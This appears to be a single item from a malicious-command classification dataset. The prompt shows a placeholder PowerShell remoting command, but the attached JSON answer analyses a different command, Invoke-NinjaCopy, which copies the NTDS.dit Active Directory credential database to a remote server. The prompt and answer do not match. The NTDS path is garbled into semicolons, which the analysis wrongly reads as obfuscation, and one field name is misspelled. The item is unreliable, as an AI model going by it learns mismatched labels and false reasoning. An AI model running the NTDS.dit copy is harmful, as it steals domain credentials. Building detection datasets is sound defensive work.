# Natural language intent:
# Execute malicious code on a remote system using PowerShell remoting.

Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}

answer:
{
  "summary": "PowerShell command using NinjaCopy to extract the Active Directory database (NTDS.dit) and copy it to a remote server, enabling offline credential theft and lateral movement.",
  "evidence": [
    {
      "code": "Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'",
      "code_explain": "NinjaCopy is a well-known PowerShell tool that bypasses file ACLs and locks to read sensitive files. The NTDS.dit file is the Active Directory database containing all domain user credentials, password hashes, group memberships, and Kerberos keys. Extracting this file is a primary target for attackers to perform offline password cracking or pass-the-hash attacks. The -ComputerName parameter indicates lateral movement to copy the file to a remote server (Server1).",
      "tag": "CREDENTIAL_ACCESS"
    },
    {
      "code": "-Path 'C:\\windows;tds;tds.dit'",
      "code_express": "The path contains semicolons which may indicate obfuscation or an attempt to access the actual NTDS.dit location (typically C:\\Windows\\NTDS\\NTDS.dit). The semicolon is sometimes used to bypass path validation or create ambiguity.",
      "tag": "DEFENSE_EVASION"
    },
    {
      "code": "-ComputerName 'Server1' -RemoteDestination",
      "code_explain": "These parameters specify a remote destination computer, indicating lateral movement or exfiltration to a remote server where the stolen credentials will be stored or processed.",
      "tag": "LATERAL_MOVEMENT"
    }
  ],
  "explain": "This is a malicious command that uses NinjaCopy to extract the NTDS.dit Active Directory database file, which contains all domain user password hashes and credential information. This is a well-known and critical attack technique used by threat actors to achieve credential theft and domain dominance. The ability to read NTDS.dit typically requires Domain Admin or equivalent privileges, making this both a credential access and privilege escalation concern. Copying the file to a remote server constitutes lateral movement and exfiltration.",
  "is_malicious": "Malicious",
  "tag": "CREDENTIAL_ACCESS"
}

